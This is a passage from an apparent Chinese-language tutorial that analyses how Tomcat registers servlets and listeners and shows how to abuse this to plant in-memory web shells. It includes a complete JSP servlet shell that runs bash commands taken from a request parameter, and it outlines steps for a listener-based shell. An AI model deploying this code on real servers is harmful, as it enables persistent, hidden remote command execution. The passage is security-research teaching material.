class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个循环：Servlet 定义注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    <span class="comment">// 创建 Servlet 的包装器（Wrapper 是 Tomcat 对 Servlet 的运行时封装）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 忽略描述、显示名和图标（这些是 web.xml 中的可选元数据）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理 load-on-startup</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理是否启用</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置 Servlet 名称（必填）</span></span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理初始化参数（web.xml 中的 &lt;init-param&gt;）</span></span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置运行身份（Run-As 角色）</span></span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理安全角色引用（web.xml 中的 &lt;security-role-ref&gt;）</span></span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">        wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关键点：设置 Servlet 类名（或 JSP 文件路径）</span></span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理文件上传配置（web.xml 中的 &lt;multipart-config&gt;）</span></span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">            multipartdef.getLocation(),</span><br><span class="line">            maxFileSize,</span><br><span class="line">            maxRequestSize,</span><br><span class="line">            fileSizeThreshold</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理异步支持（web.xml 中的 &lt;async-supported&gt;）</span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setAsyncSupported(servlet.getAsyncSupported().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置是否允许被覆盖（通常用于热部署）</span></span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将 Servlet 包装器添加到 Context 中</span></span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个循环：URL 映射注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>webxml.getServlets()</code>获取的所有<code>Servlet</code>定义，并建立循环；然后创建一个<code>Wrapper</code>对象，并设置<code>Servlet</code>的加载顺序、是否启用（即获取<code>&lt;/load-on-startup&gt;</code>标签的值）、<code>Servlet</code>的名称等基本属性；接着遍历<code>Servlet</code>的初始化参数并设置到<code>Wrapper</code>中，并处理安全角色引用、将角色和对应链接添加到<code>Wrapper</code>中；如果<code>Servlet</code>定义中包含文件上传配置，则根据配置信息设置<code>MultipartConfigElement</code>；设置<code>Servlet</code>是否支持异步操作；通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p><p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p><p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p><ul><li>创建<code>Wapper</code>对象；</li><li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li><li>设置<code>Servlet</code>的名称；</li><li>设置<code>Servlet</code>的<code>class</code>；</li><li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li><li>将<code>url</code>和<code>servlet</code>类做映射</li></ul><h3 id="servlet装载流程分析"><a href="#servlet装载流程分析" class="headerlink" title="servlet装载流程分析"></a>servlet装载流程分析</h3><p>我们在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code>这里打下断点进行调试，重点关注<code>org.apache.catalina.core.StandardContext#startInternal</code>：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907004634614.png" alt="image-20250907004634614"></p><p>可以看到，装载顺序为<code>Listener</code>–&gt;<code>Filter</code>–&gt;<code>Servlet</code>：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907004440996.png" alt="image-20250907004440996"></p><p>可以看到，上面的代码都调用了<code>org.apache.catalina.core.StandardContext#loadOnStartup</code>，<code>Ctrl+左键</code>跟进该方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                getLogger().error(</span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),</span><br><span class="line">                        StandardWrapper.getRootCause(e));</span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws</span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT</span></span><br><span class="line">                <span class="comment">// fatal to application startup</span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这段代码先是创建一个<code>TreeMap</code>，然后遍历传入的<code>Container</code>数组，将每个<code>Servlet</code>的<code>loadOnStartup</code>值作为键，将对应的<code>Wrapper</code>对象存储在相应的列表中；如果这个<code>loadOnStartup</code>值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个<code>loadOnStartup</code>的升序的顺序来加载。</p><h2 id="Servlet-内存马"><a href="#Servlet-内存马" class="headerlink" title="Servlet 内存马"></a>Servlet 内存马</h2><h3 id="servlet-内存马demo编写"><a href="#servlet-内存马demo编写" class="headerlink" title="servlet 内存马demo编写"></a>servlet 内存马demo编写</h3><p>如果我们想要写一个Servlet内存马，需要经过以下步骤：</p><ol><li>找到StandardContext</li><li>继承并编写一个恶意servlet</li><li>创建Wapper对象</li><li>设置Servlet的LoadOnStartUp的值</li><li>设置Servlet的Name</li><li>设置Servlet对应的Class</li><li>将Servlet添加到context的children中</li><li>将url路径和servlet类做映射</li></ol><p>写一个简单的demo，注意默认Mac中运行，将servlet.jsp放入Web目录下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.Servlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletURL</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;Servlet&quot;</span> + getRandomString();</span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;&#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(servletURL, servletName);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/zhandian1&quot;</span> + servletURL + <span class="string">&quot;?cmd=echo 世界，你好！&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">outError</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        outError.println(<span class="string">&quot;Error: &quot;</span> + errorMessage);</span><br><span class="line">        outError.flush();</span><br><span class="line">        outError.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907013038570.png" alt="image-20250907013038570"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907013100789.png" alt="image-20250907013100789"></p><h2 id="Listener简单介绍"><a href="#Listener简单介绍" class="headerlink" title="Listener简单介绍"></a>Listener简单介绍</h2><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/tomcat.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/tomcat.png" alt="img"></a></p><p>由上图可知，<code>Listener</code>是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的<code>Listener</code>，就又可以形成一种内存马了。</p><p>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p><ul><li><code>ServletContextListener</code>，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li><li><code>ServletRequestListener</code>，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li><li><code>HttpSessionListener</code>，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li><li><code>HttpSessionAttributeListener</code>，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。</p><h2 id="编写一个简单的Listener（ServletRequestListener）"><a href="#编写一个简单的Listener（ServletRequestListener）" class="headerlink" title="编写一个简单的Listener（ServletRequestListener）"></a>编写一个简单的Listener（ServletRequestListener）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907105544952.png" alt="image-20250907105544952"></p><h2 id="从代码层面分析Listener运行的整体流程"><a href="#从代码层面分析Listener运行的整体流程" class="headerlink" title="从代码层面分析Listener运行的整体流程"></a>从代码层面分析Listener运行的整体流程</h2><p>断点。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907105701074.png" alt="image-20250907105701074"></p><p>往下翻可以看到<code>org.apache.catalina.core.StandardContext#listenerStart</code>方法的调用：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110521029.png" alt="image-20250907110521029"></p><p>开启调试触发断点，根据堆栈回溯找到StandardContext.listenerStart()方法，这里要点进去搜一下就可以搜到了，可以看到它先调用findApplicationListeners()获取Listener的名字，然后实例化:<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110643823.png" alt="image-20250907110643823"></p><p>分类摆放完了之后，干这样一件事情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br></pre></td></tr></table></figure><p><code>Arrays.asList(...)</code> 好理解，意思就是将数组转换为列表；<code>eventListeners.addAll(...)</code>也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 <code>eventListeners</code> 中。关于括号里边的<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>这个方法，我们点进去看，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也很简单明了，就是把<code>applicationEventListenersList</code>转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。</p><p>那这总结起来就一句话，就是<code>Listener</code>有两个来源，一是根据<code>web.xml</code>文件或者<code>@WebListener</code>注解实例化得到的<code>Listener</code>；二是<code>applicationEventListenersList</code>中的<code>Listener</code>。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的<code>addFilterConfig</code>这种函数呢？当然是有的，<code>ctrl+左键</code>往上找：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907110941521.png" alt="image-20250907110941521"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907111026990.png" alt="image-20250907111026990"></p><p>方法名字叫做<code>addApplicationEventListener</code>，在<code>StandardContext.java</code>里面，代码如下，完美符合我们的需求，真是太哇塞了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Listener内存马实现"><a href="#Listener内存马实现" class="headerlink" title="Listener内存马实现"></a>Listener内存马实现</h2><p>根据上面的分析我们知道Listener来源于tomcat初始化时从web.xml实例化的Listener和applicationEventListenersList中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往applicationEventListenersList中加入我们的恶意Listener即可。实际上StandardContext存在addApplicationEventListener()方法可以直接给我们调用，往applicationEventListenersList中加入Listener。</p><p>所以我们的Listener内存马实现步骤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.继承并编写一个恶意Listener</span><br><span class="line">2.获取StandardContext</span><br><span class="line">3.调用StandardContext.addApplicationEventListener()添加恶意Listener 